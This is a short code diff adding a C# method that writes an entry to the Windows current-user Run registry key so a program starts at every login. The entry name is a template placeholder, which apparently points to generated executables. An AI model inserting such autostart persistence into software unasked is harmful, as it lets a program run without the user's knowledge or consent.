@@ -1,0 +1,8 @@
+public void AddStartup()
+		{
+
+             RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+             if (key != null) 
+			 key.SetValue("[reg-replace]", loc);
+            
+		}
